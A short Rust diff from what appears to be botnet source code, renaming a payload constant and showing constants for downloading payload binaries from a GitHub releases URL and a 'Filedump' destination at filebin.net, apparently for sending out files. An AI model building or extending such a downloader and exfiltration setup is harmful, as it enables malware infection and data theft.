@@ -17,7 +17,7 @@ mod response;
 
 const ARCHS: [&'static str; 2] = ["aarch64", "x86_64"];
 const REPO: &'static str = "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
-const PAYLOAD: &'static str = "client";
+const PAYLOAD: &'static str = "payload";
 
 // Filedump constants
 const FILEDUMP: &'static str = "https://filebin.net";
